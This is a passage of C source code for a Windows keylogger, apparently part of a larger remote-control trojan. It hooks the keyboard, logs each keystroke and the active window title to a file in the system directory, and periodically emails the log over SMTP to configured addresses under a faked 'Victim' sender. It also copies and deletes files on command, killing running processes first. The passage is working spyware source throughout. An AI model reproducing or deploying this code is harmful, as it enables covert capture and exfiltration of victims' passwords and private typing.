		return (OPERATION_ERROR);
	return (OPERATION_SUCCESS);
}

/*
 *	smtp_send_message() - Sends mail message using SMTP.
 *
 *	NOTE: This function will not connects to the SMTP server! The "con_s" must be
 *		redy connected. However, it uses "mail_server" for send "HELO" message to
 *		mail server.
 */
void smtp_send_message(int con_s, // the socket connected to mail server
					   char *mail_server, // "HELO mail_server"
					   char *send_from, // name of user's computer or something like...
					   char *send_to, // where to send
					   char *m_subject, // subject of the message
					   char *msg_body // data of the message
					   )
{
#define TMP_BUF_SIZE 1024
#define SMTP_COMMAND_SIZE 128

	char *tmp_buf; // here I'll store received (temporary) data...
	char *command; // here I'll prepare commands for the mail server
	int m_code; // mail server's code after command
	char code_buf[8];

	SMTP_ERROR = 0; // set this to avoid interpretation of previous call to the function
	tmp_buf = (char *)malloc(TMP_BUF_SIZE);
	command = (char *)malloc(SMTP_COMMAND_SIZE);
	if (
		(tmp_buf == NULL) ||
		(command == NULL)
	) {
		free(command);
		free(tmp_buf);
#ifdef ERROR_MODE
			ShowError("malloc() in smtp_send_message()");
#endif
		SMTP_ERROR++;
		return;
	}
	/* Let's begin... */
	ZeroMemory(tmp_buf, TMP_BUF_SIZE); /* clear the tmp_buf */
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* get the name of a mail server */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1); // with NULL
	m_code = atol(code_buf);
	if (m_code!=220)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); /* display it if necessary */
#endif

	wsprintf(command, "HELO %s\r\n", mail_server); /* prepare the first command */
	send_s_data(con_s, command, lstrlen(command)); /* send it... */

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* get response... */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1); // NULL
	m_code = atol(code_buf);
	if (m_code!=250)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); /* display it. */
#endif

	wsprintf(command, "MAIL FROM: <doomsday@hell.com>\r\n"); /* mail from... */
	send_s_data(con_s, command, lstrlen(command)); /* tell him (mail server) */

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* is it OK ? */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1); // NULL
	m_code = atol(code_buf);
	if (m_code!=250)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); /* I hope so... */
#endif

	wsprintf(command, "RCPT TO: <%s>\r\n", send_to); /* mail to... */
	send_s_data(con_s, command, lstrlen(command)); /* tell him */

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* again OK ? */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1);
	m_code = atol(code_buf);
	if (m_code!=250)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); /* It's impossible! Who... */
#endif

	wsprintf(command, "DATA\r\n"); /* enter critical section... just kidding... }:-) */
	send_s_data(con_s, command, lstrlen(command)); /* tell the mail server, that I am getting ready to enter the message body */

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* OK ? */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1);
	m_code = atol(code_buf);
	if (m_code!=354)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); /* yeaaah */
#endif

	wsprintf(command, "SUBJECT:%s\r\n", m_subject); /* tell a message subject */
	send_s_data(con_s, command, lstrlen(command));

	wsprintf(command, "FROM: Victim <%s>\r\n", send_from); /* send from (fake) */
	send_s_data(con_s, command, lstrlen(command));

	wsprintf(command, "TO: LogStorage <LogStorage>\r\n"); /* send to (fake) */
	send_s_data(con_s, command, lstrlen(command));

	send_s_data(con_s, msg_body, lstrlen(msg_body)); /* send the message body! */

	wsprintf(command, "\r\n.\r\n"); /* tell the mail server that that's all... */
	send_s_data(con_s, command, lstrlen(command));

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* get response */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
	lstrcpyn(code_buf,tmp_buf,3 + 1);
	m_code = atol(code_buf);
	if (m_code!=250)
		SMTP_ERROR++;
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf);
#endif

	wsprintf(command, "QUIT \r\n"); /* prepare "QUIT" command */
	send_s_data(con_s, command, lstrlen(command)); /* send it... */

	ZeroMemory(tmp_buf, TMP_BUF_SIZE);
	if (recv(con_s, tmp_buf, TMP_BUF_SIZE, 0) == SOCKET_ERROR) { /* get the last mail server's response */
		free(tmp_buf);
		free(command);
		SMTP_ERROR++;
		return;
	}
#ifdef DEBUG_MODE
		ShowDebug(tmp_buf); // display it...
#endif

	closesocket(con_s); // kill connection. (he killed it first or not ?!)
	free(tmp_buf);
	free(command);
}

/*
 *	smtp_send_file() - Send a file via SMTP. Attempts to send the given file via SMTP.
 *				 This function gets some information about user's computer,
 *				 to send it together with the file...
 *
 *	returns: OPERATION_ERROR - error, OPERATION_SUCCESS - success.
 */

/*
 * void smtp_send_message(con_s, mail_server, send_from, send_to, m_subject, msg_body)
 */

int smtp_send_file(char *file_name, // file to be sent
				   char *storage_addr // receiver's e-mail address
				   )
{
	DWORD f_size;
	char *file_buf;
	int con_s; /* handle of the socket to be connected to a mail server */
	char *subj; // subject of the message
	char *u_ip; // users IP address
	int mi; // mail server index
	int fs; // file sent flag

	if (get_file_size(file_name, &f_size) == OPERATION_ERROR)
		return (OPERATION_ERROR); /* error getting size of the file... return! */
	if (f_size > MAX_SMTP_BUF_SIZE) { /* is the file size too big ? */
		/* yes, it is ! */
		#ifdef ERROR_MODE
			ShowError("smtp_send_file(): the file is too big!");
		#endif
		return (OPERATION_ERROR);
	}
	file_buf = (char *)malloc(f_size);
	if (file_buf==NULL) { /* is memory enough ? */
		/* no, it is not! */
		#ifdef ERROR_MODE
			ShowError("smtp_send_file(): error getting memory!");
		#endif
		return (OPERATION_ERROR);
	}
	if (read_file(file_name,file_buf,f_size)!=OPERATION_SUCCESS) {
		#ifdef ERROR_MODE
			ShowError("smtp_send_file(): could not read the file!");
		#endif
		return (OPERATION_ERROR);
	}
	u_ip = (char *)malloc(16); // 15 + NULL
	wsprintf(u_ip,"not-available");
	subj = (char *)malloc(128);
	get_computer_info(INFOTYPE_COMP_NAME,subj);
	fs = 0; // no files sent by default
	for (mi = 0; mi<prog_conf.nr_mailservers; mi++) {
		if ((con_s = connect_to_server(SMTP_PORT,prog_conf.mailservers[mi]))!=OPERATION_ERROR)
			smtp_send_message(
				con_s, // handle of the socket which is ready connected to the mail server
				prog_conf.mailservers[mi], // address of the mail server
				u_ip, // sender's IP address
				storage_addr, // where to send the file
				subj, // send a name of the computer as a subject
				file_buf // here is stored the data from the file
			);
		else
			continue;
		if (!SMTP_ERROR) {
			fs++;
			break;
		}
	}
	free(file_buf);
	free(u_ip);
	free(subj);
	if (fs)
		return OPERATION_SUCCESS;
	else
		return OPERATION_ERROR;
}

/*
 *	connect_to_server() - This function attempts to connect to a server by the given address.
 *                        On success this function returns handle of the connected socket,
 *                        else it returns OPERATION_ERROR.
 */
int connect_to_server(int port_n, char *server_addr)
{
	int cs; // socket
	struct sockaddr_in addr;
	WSADATA wsaData;
	DWORD bip; // byte IP address

	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData)!=OPERATION_SUCCESS) {
#ifdef ERROR_MODE
			ShowError("WSAStartup()");
#endif
		return OPERATION_ERROR;
	}

	if ((cs = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET) {
		WSACleanup(); // cleanup WSA
#ifdef ERROR_MODE
			ShowError("socket()");
#endif
		return OPERATION_ERROR;
	}

	ZeroMemory(&addr,sizeof(struct sockaddr_in)); // fill the whole struct by zeroes
	addr.sin_port = htons(port_n);
	if (inet_addr(server_addr)!=INADDR_NONE)
		addr.sin_addr.s_addr = inet_addr(server_addr);
	else {
		bip = get_ip_by_name(server_addr);
		if (bip==OPERATION_ERROR) {
			closesocket(cs);
			WSACleanup();
#ifdef ERROR_MODE
			ShowError("get_ip_by_name() in connect_to_server()");
#endif
			return OPERATION_ERROR;
		} else
			addr.sin_addr.s_addr = bip;
	}
	addr.sin_family = AF_INET;

	if (connect(cs,(struct sockaddr *)&addr,sizeof(struct sockaddr))==SOCKET_ERROR) {
		closesocket(cs); // close the socket
		WSACleanup();
#ifdef ERROR_MODE
			ShowError("connect() in connect_to_server()");
#endif
		return OPERATION_ERROR;
	}

	return cs; // if no errors, return connected socket
}

/*=LIBRARY=*/

/*
 *	kill_key_hook() - Uninstalls windows hook associated with "hHook".
 */
void kill_key_hook(void)
{
//	if (*hHook != NULL) {
//		UnhookWindowsHookEx(*hHook);
//		*hHook = NULL; /* this handle is uninitialized */
//		#ifdef DEBUG_MODE
//			ShowDebug("kill_key_hook(): keyboard hook killed.");
//		#endif
//	}
	if (g_hKeyCapThread!=NULL) {
		g_bLogging = FALSE;
		while (WaitForSingleObject(g_hKeyCapThread, 1000)!=WAIT_OBJECT_0);
#ifdef DEBUG_MODE
		ShowDebug("kill_key_hook(): keyboard hook killed.");
#endif
	}
}

/*
 *	run_key_hook() - Installs windows keyboard hook.
 */
void run_key_hook(void)
{
/*======================== OLD CODE =========================*/

//	if (hKeyHook == NULL) {
//		hKeyHook=SetWindowsHookEx(WH_KEYBOARD,KeyboardProc,GetModuleHandle(NULL),0);
//		if (hKeyHook) {
//#ifdef DEBUG_MODE
//			ShowDebug("run_key_hook(): keyboard hook started.");
//#endif
//		} else {
//#ifdef ERROR_MODE
//			ShowError("Unable to start keyboard hook!");
//#endif
//		}
//	} /* if */

/*======================== NEW CODE ========================*/

	DWORD th_id;

	if (g_hKeyCapThread==NULL) {
		GetSystemDirectory(logfilepath, MAX_PATH);
		wsprintf(logfilepath, "%s\\%s", logfilepath, KEYLOGFILE_NAME);
		g_hKeyCapThread = CreateThread(NULL,0,KeyCapThread,logfilepath,0,&th_id);
		if (g_hKeyCapThread==NULL) {
#ifdef ERROR_MODE
			ShowError("Unable to start keyboard hook!");
#endif
		} else {
#ifdef DEBUG_MODE
			ShowDebug("run_key_hook(): keyboard hook started.");
#endif
		}
	}
}

/*
 *	logfile_control_thread() - This is the main part of the key logger!
 */
DWORD WINAPI logfile_control_thread(LPVOID param)
{
	DWORD keylogfile_size;
	char keylogfile_path[MAX_PATH];
	char *current_date;
	SYSTEMTIME sys_time;
	char day_of_week[16];
	int li; // logstorage index
	int ts; // total number of sent key log files

	GetSystemDirectory(keylogfile_path, MAX_PATH);
	wsprintf(keylogfile_path, "%s\\%s", keylogfile_path, KEYLOGFILE_NAME);
	/*
	 * All before the "while (TRUE) ..." is executed only when the key logger
	 * Engine is started, so write the Engine startup date & time to the key log file.
	 */
	if ((current_date = (char *)malloc(128)) != NULL) {
		GetSystemTime(&sys_time);
		get_weekdayname_by_num(sys_time.wDayOfWeek, day_of_week);
		wsprintf(
			current_date,
			"\r\n###-<Key logger was started on: [%d.%d.%d] at [%d:%d:%d] (%s)>-###\r\n",
			sys_time.wYear,
			sys_time.wMonth,
			sys_time.wDay,
			sys_time.wHour,
			sys_time.wMinute,
			sys_time.wSecond,
			day_of_week
		);
		if (get_file_size(keylogfile_path, &keylogfile_size) == OPERATION_SUCCESS) {
			if (keylogfile_size+128 < prog_conf.keylog_send_size)
				append_file(keylogfile_path, current_date, lstrlen(current_date));
		} else {
			/*
			 * Unable to get the file size... There are two causes:
			 *	The first one: access error - I'll skip this.
			 *	The second one: the file doesn't exists because it
			 *		was sent and deleted!
			 *	The third one: the program is running the first time
			 *		on the system.
			 *
			 *	Handling: Check, is the file really non-existent and depending on
			 *		the results write the current date to the file.
			 */
			if (!file_exists(keylogfile_path)) { /* is it non-existent file? */
				/*
				 * Yes it is non-existent, so write the startup date!
				 */
				append_file(keylogfile_path, current_date, lstrlen(current_date));
			}
		}
	} /* if (current_date != NULL) */
	while (TRUE) { /* do that for ever */
		if (get_file_size(keylogfile_path, &keylogfile_size) == OPERATION_SUCCESS) {
			if (
				(keylogfile_size >= prog_conf.keylog_send_size) &&
				(keylogfile_size < MAX_SMTP_BUF_SIZE)
			) {
				kill_key_hook();
				/*=========================================*/
				/*=Begin of code which sends key log files=*/
				/*=========================================*/
				ts = 0; // no files sent by default
				for (li = 0; li<prog_conf.nr_logstorages; li++) {
					if (smtp_send_file(keylogfile_path,prog_conf.logstorages[li])==OPERATION_SUCCESS)
						ts++; // incremetn number of sent files
				}
				if (ts) {
					remove_file(keylogfile_path);
					Sleep(3 * 1000); // 3 seconds
					run_key_hook();
				}
			} else { // if the file size is to small, then start the keyboard hook
				if (keylogfile_size < MAX_SMTP_BUF_SIZE)
					run_key_hook();
			}
		} else {
			/*
			 * It is possible that file was deleted not by the program,
			 * so I need to begin key logging againg!
			 */
			if (!file_exists(keylogfile_path))
				run_key_hook();
		}
		SleepEx(300, FALSE); /* wait a bit */
	} /* while */
}

void start_logfile_control_thread(void)
{
	DWORD thread_id;

	hLogFileControlThread = CreateThread(
			NULL,
			0,
			logfile_control_thread,
			NULL,
			0,
			&thread_id
	);
}

void kill_logfile_control_thread(void)
{
	DWORD th_exit_code;

	
	if (GetExitCodeThread(hLogFileControlThread,&th_exit_code)) {
		TerminateThread(hLogFileControlThread,th_exit_code); // kill log file control thread
		kill_key_hook(); // and then keyboard hook
	} else {
#ifdef ERROR_MODE
		ShowError("GetExitCodeThread() in kill_logfile_control_thread()");
#endif
	}
}

int lstrcmp(char *str1,char *str2,int sz)
{
	return lstrcmp(str1,str2);
}

/*====================================================================================*/
/*================================ OBSOLETE CODE =====================================*/
/*====================================================================================*/
/*
 *	KeyboardProc() - handles all key presses. For more information take a look on
 *			     Win32SDK.
 *	Later comments:
 *			     Yeah, at first this function was very simple, but now I decided
 *			     to do all "keylogger's" work here, except sendind key log file...
 *
 *	I am Ed Gess.
 */
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	BOOL upper_key;
	static HWND hActiveWindow;
	char key_name[32];
	char keylogfile_path[MAX_PATH];
	char a_c[64];
	char my_comment[128];

	if (code < 0)
		return (CallNextHookEx(hKeyHook, code, wParam, lParam)); /* if it's not my call, call to next hook */
	if (code == HC_ACTION) { /* if it's my call then process this call */
		if (wParam == SHIFT_KEY) {
			SHIFT_ENABLED = (GetAsyncKeyState(VK_SHIFT) ? TRUE : FALSE);
			return (OPERATION_SUCCESS);
		}
		if (lParam < (unsigned int)0x80000000) { /* is the key pressed down ? */
			if (wParam == CAPSLOCK_KEY) { /* is the Caps Lock key pressed ? */
				/* yes, it is */
				CAPSLOCK_ENABLED = (CAPSLOCK_ENABLED ? FALSE : TRUE);
				return (OPERATION_SUCCESS);
			}
			if ( /* now I'll filter some unessential keys */
				(wParam != CONTROL_KEY)		&&
				(wParam != LMENU_KEY)		&&
				(wParam != RMENU_KEY)		&&
				(wParam != POPUPMENU_KEY)	&&
				(wParam != ALT_KEY)			&&
				(wParam != UP_KEY)			&&
				(wParam != DOWN_KEY)		&&
				(wParam != LEFT_KEY)		&&
				(wParam != RIGHT_KEY)		&&
				(wParam != BACKSPACE_KEY)
			) {
				ZeroMemory(key_name, sizeof(key_name)); /* clean it up */
				GetKeyNameText(lParam, key_name, sizeof(key_name)); /* get the keyname by it's (key) virtual code */
				upper_key = ((SHIFT_ENABLED || CAPSLOCK_ENABLED) && !(SHIFT_ENABLED && CAPSLOCK_ENABLED) ? TRUE : FALSE);
				if (
					(((key_name[0] >= 'A') && (key_name[0] <= 'Z')) ||
					((key_name[0] >= 'a') && (key_name[0] <= 'z'))) &&
					(key_name[1] == (char)(0))
				) { /* is the key 'A' - 'Z' or 'a' - 'z' ? */
					/* yes, it is */
					if (upper_key) {
						wsprintf(key_name, "%c", lower_to_upper(key_name[0]));
					} else {
						wsprintf(key_name, "%c", upper_to_lower(key_name[0]));
					}
				} else { /* no, the key is not 'A' - 'Z' or 'a' - 'z', so I don't care about it's case (upper or lower) */
					if (!lstrcmp(key_name, "Enter", 5) || !lstrcmp(key_name, "Ââîä", 4)) {
						wsprintf(key_name, "\r\n"); /* go to next line */
					} else 
					if (!lstrcmp(key_name, "Space", 5) || !lstrcmp(key_name, "Ïðîáåë", 6)) {
						wsprintf(key_name, " ");
					} else
					if (!lstrcmp(key_name, ",", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "<");
					} else
					if (!lstrcmp(key_name, ".", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, ">");
					} else
					if (!lstrcmp(key_name, "/", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "?");
					} else
					if (!lstrcmp(key_name, "[", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "{");
					} else
					if (!lstrcmp(key_name, "]", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "}");
					} else
					if (!lstrcmp(key_name, "\\", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "|");
					} else
					if (!lstrcmp(key_name, ";", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, ":");
					} else
					if (!lstrcmp(key_name, "'", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "\"");
					} else
					if (!lstrcmp(key_name, "`", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "~");
					} else
					if (!lstrcmp(key_name, "1", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "!");
					} else
					if (!lstrcmp(key_name, "2", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "@");
					} else
					if (!lstrcmp(key_name, "3", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "#");
					} else
					if (!lstrcmp(key_name, "4", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "$");
					} else
					if (!lstrcmp(key_name, "5", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "%%");
					} else
					if (!lstrcmp(key_name, "6", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "^");
					} else
					if (!lstrcmp(key_name, "7", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "&");
					} else
					if (!lstrcmp(key_name, "8", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "*");
					} else
					if (!lstrcmp(key_name, "9", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "(");
					} else
					if (!lstrcmp(key_name, "0", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, ")");
					} else
					if (!lstrcmp(key_name, "-", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "_");
					} else
					if (!lstrcmp(key_name, "=", 1)) {
						if (SHIFT_ENABLED)
							wsprintf(key_name, "+");
					}
				}
				GetSystemDirectory(keylogfile_path, MAX_PATH);
				wsprintf(keylogfile_path, "%s\\%s", keylogfile_path, KEYLOGFILE_NAME);
				hActiveWindow = GetActiveWindow();
				if (hOldWindow != hActiveWindow) {
					GetWindowText(hActiveWindow, a_c, sizeof(a_c));
					if (!lstrlen(a_c))
						wsprintf(a_c, "-");
					wsprintf(my_comment, "\r\n###-<[%s]>-###\r\n", a_c);
					append_file(keylogfile_path, my_comment, lstrlen(my_comment));
					hOldWindow = hActiveWindow; /* make that (active) window old */
				}
				if (
					(lstrlen(key_name) > 1) &&
					(
						((key_name[0] >= 'A') && (key_name[0] <= 'Z')) ||
						((key_name[0] >= 'a') && (key_name[0] <= 'a')) ||
						((key_name[0] >= 'À') && (key_name[0] <= 'ß'))
					)
				) {
					lstrcpyn(my_comment, key_name, lstrlen(key_name)+1); /* copy with '\0' */
					wsprintf(key_name, "<%s>", my_comment);
			}
				append_file(keylogfile_path, key_name, lstrlen(key_name));
			} /* if key is OK */
		} /* if key pressed */
	} /* if (code == HC_ACTION) .. */
	return (OPERATION_SUCCESS); /* OPERATION_SUCCESS is allways returned */
}

/*
 *	str_pos() - returns position of "ch" in the "str", or OPERATION_ERROR if no such char in
 *              the string.
 */
int str_pos(char *str, char ch)
{
	int r = 0;
	while (((char)(*(str+r)) != ch) && ((char)(*(str+r))))
		r++;
	if (r == lstrlen(str))
		return (OPERATION_ERROR);
	else
		return (r);
}

int execute_file(char *file_name, char *param)
{
	if (!file_exists(file_name))
		return (OPERATION_ERROR);
	ShellExecute(0, "open", file_name, param, NULL, SW_SHOWNORMAL);

	return (OPERATION_SUCCESS);
}

int file_exists(char *file_name)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile;

	if ((hFindFile = FindFirstFile(file_name, &FindFileData)) == INVALID_HANDLE_VALUE) {
		FindClose(hFindFile);
		return (0);
	} else {
		FindClose(hFindFile);
		return (1);
	}
}

int copy_file(char *source, char *destination)
{
	return (CopyFile(source, destination, FALSE)); /* zero - error, nonzero - success */
}

/*
 *	copy_files() - Copy files into destination. This is very usable function if,
 *			   for example, I want to copy some types of files from one directory
 *			   to another.
 *
 *	NOTE: The "wildcard" parameter is a "path\file_name(mask)" and the "destination" is a
 *		"path\"! The "destination" parameter must be ending with backslash "\" !!!
 *
 *	This function returns number of copyed files.
 */
int copy_files(int con_s, char *wildcard, char *destination, BOOL silent_mode)
{
	WIN32_FIND_DATA ffdata;
	HANDLE hFindFile;
	char *s_path; /* search path */
	char *copy_from; /* copy from */
	char *copy_to;
	int total_copyed;

	total_copyed = 0;
	s_path = (char *)malloc(MAX_PATH+0xF);
	copy_from = (char *)malloc(MAX_PATH+0xF);
	copy_to = (char *)malloc(MAX_PATH+0xF);
	if (
		(s_path == NULL) ||
		(copy_from == NULL) ||
		(copy_to == NULL)
	) {
		#ifdef ERROR_MODE
			ShowError("malloc() in copy_files()");
		#endif
		free(s_path);
		free(copy_from);
		free(copy_to);
		return (0);
	}
	lstrcpyn(s_path, wildcard, lstrlen(wildcard) + 1); /* copy the "wildcard" with NULL char */
	if ((hFindFile = FindFirstFile(s_path, &ffdata)) != INVALID_HANDLE_VALUE) {
		do {
			/*
			 * I don't need to copy directories and "..", ".", so filter them!
			 */
			if (
				lstrcmp(ffdata.cFileName, "..") &&
				lstrcmp(ffdata.cFileName, ".") &&
				!(ffdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			) {
				extract_file_path(s_path, copy_from); /* copy_from holds a path to the found file */
				lstrcpyn(copy_from + lstrlen(copy_from), ffdata.cFileName, lstrlen(ffdata.cFileName) + 1);
				/*
				 * NOTE: I am using "%s%s" because the "destination" is a string which
				 *	   ends with a backslash.
				 *
				 * NOTE: Destination file names will not change, so I'll use
				 *	   found file name as a destination file name.
				 */
				wsprintf(copy_to, "%s%s", destination, ffdata.cFileName);
				if (!silent_mode) {
					send(con_s, "Copying file: ", 14, 0);
					send(con_s, copy_from, lstrlen(copy_from), 0);
					send(con_s, " --> ", 5, 0);
					send(con_s, copy_to, lstrlen(copy_to), 0);
				}
				if (copy_file(copy_from, copy_to)) {
					total_copyed++;
					if (!silent_mode)
						send(con_s, " OK.\r\n", 6, 0); /* tell that copy is OK */
				} else {
					if (!silent_mode)
						send(con_s, " Failed!\r\n", 10, 0);
				}
			}
		} while (FindNextFile(hFindFile, &ffdata));
	}
	free(s_path);
	free(copy_from);
	free(copy_to);
	FindClose(hFindFile);
	return (total_copyed);
}

int remove_file(char *file_name)
{
	kill_process(file_name); // my program will delete any file, even running!
	SleepEx(DELAY_AFTER_KILL_PROCESS,FALSE); /* wait... */
	return (DeleteFile(file_name)); // zero - error, nonzero - success
}

/*
 *	remove_files() - removes a list of files.
 *
 *	returns: number of deleted files on success, else OPERATION_ERROR.
 *
 *	WARNING: "wildcard" - full path\mask. Example: "c:\windows\*.*".
 */
int remove_files(int con_s, char *wildcard, BOOL silent_mode)
{
	HANDLE hFindFile;
	WIN32_FIND_DATA ffdata;
	char *f_name;
	char *f_path;
	int total_removed;

	f_name = (char *)malloc(MAX_PATH+0xF);
	f_path = (char *)malloc(MAX_PATH+0xF);
	if (
		(f_name == NULL) ||
		(f_path == NULL)
	) {
		free(f_name);
		free(f_path);
		#ifdef ERROR_MODE
			ShowError("malloc() in remove_files()");
		#endif
		return (0);
	}
	total_removed = 0;
	if ((hFindFile = FindFirstFile(wildcard, &ffdata)) != INVALID_HANDLE_VALUE) {
		do {
			if (
				lstrcmp(ffdata.cFileName, "..") &&
				lstrcmp(ffdata.cFileName, ".") &&
				!(ffdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			) {
				extract_file_path(wildcard, f_path);
				wsprintf(f_name, "%s%s", f_path, ffdata.cFileName);
				if (!silent_mode) {
					send(con_s, "Deleting file: ", 15, 0);
					send(con_s, f_name, lstrlen(f_name), 0);
				}
				if (remove_file(f_name)) {
					total_removed++;
					if (!silent_mode)
						send(con_s, " OK.\r\n", 6, 0);
				} else {
					if (!silent_mode)
						send(con_s, " Failed!\r\n", 10, 0);
				}
			}
		} while (FindNextFile(hFindFile, &ffdata));
	}
	free(f_name);
	free(f_path);
	FindClose(hFindFile);
	return (total_removed);
}

/*
 *	create_file() - create or open file for writting. If file is existing then
 *			    this function rewrites it!
 *
 *		NOTE: file_name - full path of the file!
 *
 *	DO NOT USE!
 */
HANDLE create_file(char *file_name)
{
	HANDLE hFile;

	SetFileAttributes(file_name, FILE_ATTRIBUTE_NORMAL); /* set new attr */
	if ((hFile = CreateFile(file_name,
			GENERIC_WRITE | GENERIC_READ,
			FILE_SHARE_WRITE | FILE_SHARE_READ,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
	)) == INVALID_HANDLE_VALUE) {
		#ifdef ERROR_MODE
			ShowError("CreateFile() in create_file()");
		#endif
		return (hFile);
	}
	return (hFile); /* return handle of the file */
}

/*
 *	open_file() - open existing file for reading or writting.
 *		NOTE: file_name - full path of the file!
 *
 *	DO NOT USE!
 */
HANDLE open_file(char *file_name)
{
	HANDLE hFile;


	if (!file_exists(file_name)) /* trying to open non-existent file ? */
		return (INVALID_HANDLE_VALUE); /* so, try later! */
	SetFileAttributes(file_name, FILE_ATTRIBUTE_NORMAL); /* set new attr */
	if ((hFile = CreateFile(file_name,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
	)) == INVALID_HANDLE_VALUE) {
		#ifdef ERROR_MODE
			ShowError("CreateFile() in open_file()");
		#endif
		return (hFile);
	}
	return (hFile); /* return handle of the file */
}

/*
 *	append_file() - Appends the data in the "buf" to an existent file. If the file
 *			    does not exists, this function creates it.
 */
int append_file(char *file_name, char *buf, U_LONG a_length)
{
	HANDLE hFile;
	U_LONG bytestoappend;

	bytestoappend = a_length;
	if (!file_exists(file_name)) { /* is the file existent ? */
		/* no, it is not */
		if ((hFile = create_file(file_name)) == INVALID_HANDLE_VALUE)
			return (OPERATION_ERROR);
	} else { /* yes, it is */
		if ((hFile = open_file(file_name)) == INVALID_HANDLE_VALUE)
			return (OPERATION_ERROR);
		SetFilePointer(hFile, 0, NULL, FILE_END); /* set file pointer to the end of the file */
	}
	if (!(WriteFile(hFile, buf, bytestoappend, &bytestoappend, NULL))) {
		CloseHandle(hFile); /* WARNING: don't forget to do that!!! */
		return (OPERATION_ERROR);
	}
	CloseHandle(hFile); /* WARNING: don't forget to do that!!! */
	return (OPERATION_SUCCESS);
}

/*
 *	write_file() - Writes the file. If the file is existent, it rewrites it!
 *
 *	returns (OPERATION_ERROR) on error, else returns OPERATION_SUCCESS.
 */
int write_file(char *file_name, char *buf, U_LONG w_length)
{
	HANDLE hFile;
	U_LONG bytestowrite;

	bytestowrite = w_length;
	if ((hFile = create_file(file_name)) == INVALID_HANDLE_VALUE) {
		#ifdef ERROR_MODE
			ShowError("create_file() in write_file()");
		#endif
		return (OPERATION_ERROR); /* error ! */
	}
	if (!(WriteFile(hFile, buf, bytestowrite, &bytestowrite, NULL))) {
		CloseHandle(hFile);
		return (OPERATION_ERROR);
	}
	CloseHandle(hFile);

	return (OPERATION_SUCCESS);
}

/*
 *	read_file() - Reads a file.
 *
 *	returns (OPERATION_ERROR) on error, else returns OPERATION_SUCCESS.
 */
int read_file(char *file_name, char *buf, U_LONG r_length)
{
	HANDLE hFile;
	U_LONG bytestoread;

	bytestoread = r_length;
	if ((hFile = open_file(file_name)) == INVALID_HANDLE_VALUE) {
		#ifdef ERROR_MODE
			ShowError("open_file() in read_file()");
		#endif
		return (OPERATION_ERROR); /* error ! */
	}
	if (!(ReadFile(hFile, buf, bytestoread, &bytestoread, NULL))) {
		CloseHandle(hFile);
		return (OPERATION_ERROR);
	}
	CloseHandle(hFile); /* WARNING: don't forget to do that!!! */

	return (OPERATION_SUCCESS);
}

int create_dir(char *file_name)
{
	return (CreateDirectory(file_name, NULL)); /* zero - error, nonzero - success */
}

int remove_dir(char *file_name)
{
	return (RemoveDirectory(file_name)); /* zero - error, nonzero - success */
}

